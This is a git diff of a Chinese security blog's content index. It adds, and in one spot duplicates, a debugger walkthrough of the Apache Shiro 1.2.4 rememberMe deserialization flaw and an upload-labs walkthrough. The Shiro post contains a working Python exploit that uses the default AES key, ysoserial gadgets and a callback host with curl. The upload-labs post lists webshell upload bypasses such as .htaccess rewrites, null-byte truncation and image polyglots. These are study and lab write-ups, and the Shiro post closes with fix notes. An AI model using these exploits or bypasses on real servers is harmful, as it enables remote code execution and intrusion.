-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223822.png" alt="image-20200731114542521"></p>
-<p>整个登录过程大致为这样</p>
-<h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>要想找到解密的入口位置，首先我们需要在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code> 下个断点</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223851.png" alt="image-20200731143126894"></p>
-<p>这是我们得到的调用链，根据函数名字我们可以知道，<code>getRememberedIdentity</code>是获取<code>cookie</code>中的<code>rememberMe</code>进行解析，所以我们可以选择在<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedIdentity</code>下一个断点</p>
-<pre><code>1. decrypt:486, AbstractRememberMeManager (org.apache.shiro.mgt)
-2. convertBytesToPrincipals:429, AbstractRememberMeManager (org.apache.shiro.mgt)
-3. getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)
-4. getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</code></pre><p>然后我们跟进一下<code>getRememberedPrincipals</code>这个函数</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223933.png" alt="image-20200731152746429"></p>
-<p>首先是是要得到<code>rememberMe</code>序列化后的值</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223939.png" alt="image-20200731153224590"></p>
-<p>跟进以后可以看到是进行了<code>Base64.deocde</code>之后再返回序列化数据</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223946.png" alt="image-20200731153715075"></p>
-<p>到<code>convertBytesToPrincipals</code>函数应该就是<code>AES</code>解密的操作了</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224004.png" alt="image-20200731153843497"></p>
-<p>继续跟进解密函数</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224011.png" alt="image-20200731153944948"></p>
-<p>然后获取加解密服务类进行解密，使用的<code>key</code>依然是默认<code>key</code></p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224024.png" alt="image-20200731154036729"></p>
-<p>首先是获取解密需要的<code>iv</code>值，后面就是很正常的<code>AES</code>解密步骤了</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224048.png" alt="image-20200731151402487"></p>
-<p>之后返回解密后的序列化值</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224111.png" alt="image-20200731155653747"></p>
-<p>然后就是最后一步的反序列化</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224118.png" alt="image-20200731161249665"></p>
-<p>后面是就调用<code>readObject</code>函数进行反序列化了</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224124.png" alt="image-20200731161543385"></p>
-<p>按理来说到这里就可以直接操作get shell了，但是这里还有另外一个问题</p>
-<p>在@orange和@zsx文章中提到</p>
-<blockquote>
-<p>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
-</blockquote>
-<p>我们继续跟进<code>readObject</code>，我们会发现shiro重构了自己的<code>resolveClass</code>，这里使用的是<code>ClassUtils.forName</code></p>
-<blockquote>
-<p>而jdk原版的<code>resovleClass</code>是 <code>Class.forName</code> </p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224138.png" alt="image-20200731162304022"></p>
-<p>跟进去发现其实底层是调用了<code>loadClass</code>函数</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224146.png" alt="image-20200731162553365"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>编写exp如下</p>
-<pre><code class="python">import requests as rq
-import subprocess
-import base64
-import uuid
-from Crypto.Cipher import AES
-from random import Random
-
-target = &#39;http://127.0.0.1:8080/shiro/&#39;
-dns_server = &#39;http://xxxxx.ceye.io&#39;
-use_jar = [&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;]
-cmd = &#39;touch /tmp/shiro.txt&#39;
-jrmp_server_ip = &#39;127.0.0.1&#39;
-jrmp_server_port = &#39;9999&#39;
-
-def self_cmd():
-    # user-defined cmd
-    popen = subprocess.Popen(use_jar + [&#39;CommonsCollections2&#39;, cmd], stdout=subprocess.PIPE)
-    payload = popen.stdout.read()
-    return payload
-
-def urldns():
-    # use URLDNS gadget
-    print(f&quot;[*] test dns_server:\n{dns_server}&quot;)
-    popen = subprocess.Popen(use_jar + [&#39;URLDNS&#39;, dns_server], stdout=subprocess.PIPE)
-    payload = popen.stdout.read()
-    return payload
-
-def jrmp():
-    # use JRMPClient gadget
-    # Server: 
-    # java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections5 &#39;curl http://xxxxx.ceye.io&#39;
-    popen = subprocess.Popen(use_jar + [&#39;JRMPClient&#39;, f&quot;{jrmp_server_ip}:{jrmp_server_port}&quot;], stdout=subprocess.PIPE)
-    payload = popen.stdout.read()
-    return payload
-
-def exp(payload):
-    # AES encode
-    BS = AES.block_size
-    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
-    key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;
-    mode = AES.MODE_CBC
-    iv = uuid.uuid4().bytes
-    encryptor = AES.new(base64.b64decode(key), mode, iv)
-    padding = pad(payload)
-    b64 = base64.b64encode(iv + encryptor.encrypt(padding)).decode()
-
-    try:
-        print(f&#39;[*] send payload:\n{b64}&#39;)
-        res = rq.get(target, cookies={&#39;rememberMe&#39;: b64})
-        print(f&#39;[*] send finished&#39;)
-        # print(f&quot;[*] response:\n{res.text}&quot;)
-    except Exception as e:
-        print(f&quot;[*] send failed:\n{e}&quot;)
-
-
-if __name__ == &quot;__main__&quot;:
-    # exp(self_cmd())
-    # exp(urldns())
-    exp(jrmp())</code></pre>
-<blockquote>
-<p>但是不知道为什么JRMP打不通，如果有师傅知道的可以指点一下</p>
-</blockquote>
-<p>推荐一个好用的工具：<a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit</a></p>
-<h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>针对这个问题shiro解决了自带的硬编码的问题，当然如果用户还是用硬编码的方式，一旦key泄漏，一样是会造成反序列化的问题。</p>
-<p>官方针对这个问题的修复方式：</p>
-<p>1、删除相关默认密钥</p>
-<p>2、如果没有配置密钥，会随机生成一个密钥。</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.lmxspace.com/2019/10/17/Shiro-反序列化记录/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/17/Shiro-反序列化记录/</a></p>
-<p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p>
-<p><a href="https://www.cnblogs.com/paperpen/p/11312671.html" target="_blank" rel="noopener">https://www.cnblogs.com/paperpen/p/11312671.html</a></p>
-]]></content>
-      <tags>
-        <tag>漏洞分析</tag>
       </tags>
   </entry>
   <entry>
@@ -3537,6 +3312,198 @@ echo base64_encode(serialize(new Pivot()));</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Shiro 1.2.4 反序列化链分析</title>
+    <url>/2020/08/01/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>git clone https://github.com/apache/shiro.git  
+cd shiro
+git checkout shiro-root-1.2.4  </code></pre><a id="more"></a>
+
+<p>编辑<code>pom.xml</code>，添加如下jar包</p>
+<pre><code class="xml">&lt;!--  需要设置编译的版本 --&gt;  
+    &lt;properties&gt;
+       &lt;maven.compiler.source&gt;1.6&lt;/maven.compiler.source&gt;
+       &lt;maven.compiler.target&gt;1.6&lt;/maven.compiler.target&gt;
+   &lt;/properties&gt;
+...
+   &lt;dependencies&gt;
+       &lt;dependency&gt;
+           &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
+           &lt;artifactId&gt;jstl&lt;/artifactId&gt;
+           &lt;!--  这里需要将jstl设置为1.2 --&gt;
+           &lt;version&gt;1.2&lt;/version&gt; 
+           &lt;scope&gt;runtime&lt;/scope&gt;
+       &lt;/dependency&gt;
+.....
+       &lt;dependency&gt;
+           &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+           &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+           &lt;version&gt;4.0&lt;/version&gt;
+       &lt;/dependency&gt;
+&lt;dependencies&gt;  </code></pre>
+<p>创建<code>~/.m2/toolchains.xml</code>文件，添加jdk1.6环境</p>
+<pre><code class="xml">&lt;toolchains&gt;
+    &lt;toolchain&gt;
+      &lt;type&gt;jdk&lt;/type&gt;
+      &lt;provides&gt;
+        &lt;version&gt;1.6&lt;/version&gt;
+        &lt;vendor&gt;sun&lt;/vendor&gt;
+      &lt;/provides&gt;
+      &lt;configuration&gt;
+        &lt;jdkHome&gt;D:\Java\jdk1.6.0_45&lt;/jdkHome&gt;
+      &lt;/configuration&gt;
+    &lt;/toolchain&gt;
+&lt;/toolchains&gt;</code></pre>
+<p>编译成war包</p>
+<pre><code>cd shiro/samples/web  
+mvn package -D maven.skip.test=true</code></pre><p>把生成的<code>samples-web-1.2.4.war</code>放到Tomcat的webapps目录下，为了方便重命名为<code>shiro.war</code></p>
+<p>启动tomcat，访问<code>http://127.0.0.1:8080/shiro/</code>，搭建完成</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223304.png" alt="image-20200728102626680"></p>
+<h2 id="漏洞链分析"><a href="#漏洞链分析" class="headerlink" title="漏洞链分析"></a>漏洞链分析</h2><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>因为漏洞出现在<code>Remember Me</code>，所以我们记得勾选，然后再进行登录</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223410.png" alt="image-20200731112027369"></p>
+<p>在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code> 处下个断点，传入的三个参数都包含了我们登陆的信息</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223420.png" alt="image-20200731112430152"></p>
+<p>跟进<code>forgetIdentity</code>方法，它会对<code>subject</code>变量进行处理</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223426.png" alt="image-20200731112640520"></p>
+<p>继续跟进<code>forgetIdentity</code>方法，我们会发现它主要是对<code>set-cookie</code>的一些处理</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223444.png" alt="image-20200731112808224"></p>
+<p>继续跟进下一步，首先会判断我们有无设置<code>Remember Me</code>，如果有的话就会进入<code>rememberIdentity</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223449.png" alt="image-20200731113121803"></p>
+<p>继续跟进，也是对用户的登录信息进行处理</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223456.png" alt="image-20200731113634580"></p>
+<p>我们可以看到他们把用户信息序列化之后，会进行加密</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223502.png" alt="image-20200731113733542"></p>
+<p>这里是加密函数，这一步是获取加密所采取的方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223506.png" alt="image-20200731113853889"></p>
+<p>观察本地变量，我们可以看到它加密的方法用的是AES的CBC方式</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223544.png" alt="image-20200731114018051"></p>
+<p>数据加密主要发生在这一步</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223745.png" alt="image-20200731141144566"></p>
+<p><code>getEncryptionCipherKey</code>函数是获得加密所需要的<code>Key</code>，因为传入的是空参数，所以采用的是默认的<code>Key</code>，这个是可以直接在源码找到的</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223745.png" alt="image-20200731142820956"></p>
+<p>然后会将序列化好的数据进行AES加密</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223822.png" alt="image-20200731141442083"></p>
+<p>加密完之后就会返回加密的结果</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223809.png" alt="image-20200731114416038"></p>
+<p>后面会对返回后的加密值进行进一步处理</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223802.png" alt="image-20200731114450542"></p>
+<p>是对序列化后的值进行<code>Base64</code>加密后存放在<code>Cookie</code>中</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223822.png" alt="image-20200731114542521"></p>
+<p>整个登录过程大致为这样</p>
+<h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>要想找到解密的入口位置，首先我们需要在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code> 下个断点</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223851.png" alt="image-20200731143126894"></p>
+<p>这是我们得到的调用链，根据函数名字我们可以知道，<code>getRememberedIdentity</code>是获取<code>cookie</code>中的<code>rememberMe</code>进行解析，所以我们可以选择在<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedIdentity</code>下一个断点</p>
+<pre><code>1. decrypt:486, AbstractRememberMeManager (org.apache.shiro.mgt)
+2. convertBytesToPrincipals:429, AbstractRememberMeManager (org.apache.shiro.mgt)
+3. getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)
+4. getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</code></pre><p>然后我们跟进一下<code>getRememberedPrincipals</code>这个函数</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223933.png" alt="image-20200731152746429"></p>
+<p>首先是是要得到<code>rememberMe</code>序列化后的值</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223939.png" alt="image-20200731153224590"></p>
+<p>跟进以后可以看到是进行了<code>Base64.deocde</code>之后再返回序列化数据</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223946.png" alt="image-20200731153715075"></p>
+<p>到<code>convertBytesToPrincipals</code>函数应该就是<code>AES</code>解密的操作了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224004.png" alt="image-20200731153843497"></p>
+<p>继续跟进解密函数</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224011.png" alt="image-20200731153944948"></p>
+<p>然后获取加解密服务类进行解密，使用的<code>key</code>依然是默认<code>key</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224024.png" alt="image-20200731154036729"></p>
+<p>首先是获取解密需要的<code>iv</code>值，后面就是很正常的<code>AES</code>解密步骤了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224048.png" alt="image-20200731151402487"></p>
+<p>之后返回解密后的序列化值</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224111.png" alt="image-20200731155653747"></p>
+<p>然后就是最后一步的反序列化</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224118.png" alt="image-20200731161249665"></p>
+<p>后面是就调用<code>readObject</code>函数进行反序列化了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224124.png" alt="image-20200731161543385"></p>
+<p>按理来说到这里就可以直接操作get shell了，但是这里还有另外一个问题</p>
+<p>在@orange和@zsx文章中提到</p>
+<blockquote>
+<p>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
+</blockquote>
+<p>我们继续跟进<code>readObject</code>，我们会发现shiro重构了自己的<code>resolveClass</code>，这里使用的是<code>ClassUtils.forName</code></p>
+<blockquote>
+<p>而jdk原版的<code>resovleClass</code>是 <code>Class.forName</code> </p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224138.png" alt="image-20200731162304022"></p>
+<p>跟进去发现其实底层是调用了<code>loadClass</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224146.png" alt="image-20200731162553365"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>编写exp如下</p>
+<pre><code class="python">import requests as rq
+import subprocess
+import base64
+import uuid
+from Crypto.Cipher import AES
+from random import Random
+
+target = &#39;http://127.0.0.1:8080/shiro/&#39;
+dns_server = &#39;http://xxxxx.ceye.io&#39;
+use_jar = [&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;]
+cmd = &#39;touch /tmp/shiro.txt&#39;
+jrmp_server_ip = &#39;127.0.0.1&#39;
+jrmp_server_port = &#39;9999&#39;
+
+def self_cmd():
+    # user-defined cmd
+    popen = subprocess.Popen(use_jar + [&#39;CommonsCollections2&#39;, cmd], stdout=subprocess.PIPE)
+    payload = popen.stdout.read()
+    return payload
+
+def urldns():
+    # use URLDNS gadget
+    print(f&quot;[*] test dns_server:\n{dns_server}&quot;)
+    popen = subprocess.Popen(use_jar + [&#39;URLDNS&#39;, dns_server], stdout=subprocess.PIPE)
+    payload = popen.stdout.read()
+    return payload
+
+def jrmp():
+    # use JRMPClient gadget
+    # Server: 
+    # java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections5 &#39;curl http://xxxxx.ceye.io&#39;
+    popen = subprocess.Popen(use_jar + [&#39;JRMPClient&#39;, f&quot;{jrmp_server_ip}:{jrmp_server_port}&quot;], stdout=subprocess.PIPE)
+    payload = popen.stdout.read()
+    return payload
+
+def exp(payload):
+    # AES encode
+    BS = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;
+    mode = AES.MODE_CBC
+    iv = uuid.uuid4().bytes
+    encryptor = AES.new(base64.b64decode(key), mode, iv)
+    padding = pad(payload)
+    b64 = base64.b64encode(iv + encryptor.encrypt(padding)).decode()
+
+    try:
+        print(f&#39;[*] send payload:\n{b64}&#39;)
+        res = rq.get(target, cookies={&#39;rememberMe&#39;: b64})
+        print(f&#39;[*] send finished&#39;)
+        # print(f&quot;[*] response:\n{res.text}&quot;)
+    except Exception as e:
+        print(f&quot;[*] send failed:\n{e}&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    # exp(self_cmd())
+    # exp(urldns())
+    exp(jrmp())</code></pre>
+<blockquote>
+<p>但是不知道为什么JRMP打不通，如果有师傅知道的可以指点一下</p>
+</blockquote>
+<p>推荐一个好用的工具：<a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit</a></p>
+<h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>针对这个问题shiro解决了自带的硬编码的问题，当然如果用户还是用硬编码的方式，一旦key泄漏，一样是会造成反序列化的问题。</p>
+<p>官方针对这个问题的修复方式：</p>
+<p>1、删除相关默认密钥</p>
+<p>2、如果没有配置密钥，会随机生成一个密钥。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.lmxspace.com/2019/10/17/Shiro-反序列化记录/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/17/Shiro-反序列化记录/</a></p>
+<p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p>
+<p><a href="https://www.cnblogs.com/paperpen/p/11312671.html" target="_blank" rel="noopener">https://www.cnblogs.com/paperpen/p/11312671.html</a></p>
+]]></content>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>babyvm-vm逆向</title>
     <url>/2021/03/28/babyvm-vm%E9%80%86%E5%90%91/</url>
     <content><![CDATA[<blockquote>
@@ -3902,6 +3869,228 @@ print(&#39;[+] flag: &#39;, &#39;&#39;.join([chr(_) for _ in flag]))
 ]]></content>
       <tags>
         <tag>Reverse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>upload-labs</title>
+    <url>/2020/02/28/upload-labs/</url>
+    <content><![CDATA[<blockquote>
+<p>之前的一些关于 upload-labs 的练习</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>修改后缀名</p>
+<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>Content-type 改为 image/gif</p>
+<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><ol>
+<li><p>改后缀名  <code>php2, php3, php4, php5, phps, pht, phtm, phtml</code></p>
+</li>
+<li><p>重写文件解析规则绕过。上传先上传一个名为<code>.htaccess</code>文件，内容如下：</p>
+</li>
+</ol>
+<pre><code>&lt;FilesMatch &quot;03.jpg&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre><p>然后再上传一个<code>03.jpg</code></p>
+<p>执行上传的<code>03.jpg</code>脚本</p>
+<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>查看源代码 发现黑名单几乎过滤了全部的违法后缀名 ，<strong>但少过滤了 .htaccess 后缀</strong></p>
+<ol>
+<li>上传一个.htaccess 文件 重写 服务器的文件解析  </li>
+</ol>
+<p>创建一个 .htaccess 文件</p>
+<p>内容可以是 : AddType application/x-httpd-php .jpg,可将jpg文件解析为php文件.</p>
+<p>或者是 : SetHandler application/x-httpd-php,可将其他所有文件解析为php文件.</p>
+<ol start="2">
+<li>利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：</li>
+</ol>
+<pre><code>双引号&quot;     =   点号.
+大于符号&gt;   =   问号?
+小于符号&lt;   =   星号*</code></pre><p>先把4.php文件后缀改为4.jpg  然后用bs 将文件名改为 4.php:.jpg，上传成功后会生成4.php的空文件，大小为0KB.</p>
+<p>然后再在bs 中把文件名 改为4.&lt;或4.&lt;&lt;&lt;或4.&gt;&gt;&gt;或4.&gt;&gt;&lt;后再次上传，重写4.php文件内容，Webshell代码就会写入原来的4.php空文件中。</p>
+<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>查看源代码发现 黑名单里加上了 .htaccess 后缀 ，但是没有 进行大小写过滤</p>
+<p>与 Pass-04 一样</p>
+<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>在 pass-05 的基础上加上了大小写过滤， 但发现去掉了收尾去空</p>
+<p>查了一下：<code>trim()</code>函数 : <code>移除字符串两侧的空白字符或其他预定义字符</code>.</p>
+<p>Win下<code>xx.jpg[空格] 或xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点**</p>
+<p>用 bs 在1.php 后缀名后面加一个空格成功绕过</p>
+<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>没有删除文件后缀名的点</p>
+<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>查看源代码后发现 黑名单过滤 没有去字符串 ::$DATA </p>
+<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。<br>上传<code>.php::$DATA</code>绕过。(仅限windows)  上传后 自动保存为 1.php</p>
+<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>原理同Pass-06</strong>，上传文件名后加上<strong>点+空格+点</strong>，改为<code>09.php. .</code></p>
+<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>双写文件名绕过，文件名改成<code>10.pphphp</code></p>
+<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>上传路径名%00截断绕过。上传的文件名写成<code>11.jpg</code>, save_path改成<code>../upload/11.php%00</code>，最后保存下来的文件就是<code>11.php</code></p>
+<p>但这东西有点过气了，因为需要两个条件</p>
+<ol>
+<li>php版本小于5.3.4</li>
+<li>php的<strong>magic_quotes_gpc</strong>为OFF状态</li>
+</ol>
+<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>php.ini设置 <code>magic_quotes_gpc = Off</code></p>
+<p>POST 不能解析 url 编码，所以可以用 0x00</p>
+<p>原理同<strong>Pass-11</strong>，上传路径0x00绕过。利用Burpsuite的Hex功能将save_path改成<code>../upload/12.php【二进制00】</code>形式</p>
+<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>代码通过读取上传文件的<strong>前两字节判断是否为图片</strong></p>
+<pre><code> $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin); </code></pre><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p>
+<p>使用命令<code>copy normal.jpg /b + shell.php /a webshell.jpg</code>，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg" target="_blank" rel="noopener">JPG一句话shell参考示例</a></p>
+<p>png图片处理方式同上。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png" target="_blank" rel="noopener">PNG一句话shell参考示例</a></p>
+<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><code>getimagesize</code>通过检查图像文件的大小并返回图像的尺寸以及文件类型</p>
+<pre><code>list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</code></pre><p><code>image_type_to_extension</code>根据指定的图像类型返回对应的后缀名</p>
+<p>原理和示例同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
+<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><pre><code>$image_type = exif_imagetype($filename);</code></pre><p><img src="C:%5CUsers%5CIrving%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564977362026.png" alt="1564977362026"></p>
+<p>原理同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
+<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p>
+<p>这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif" target="_blank" rel="noopener">示例</a>。</p>
+<p>打开被渲染后的图片，Webshell代码仍然存在。</p>
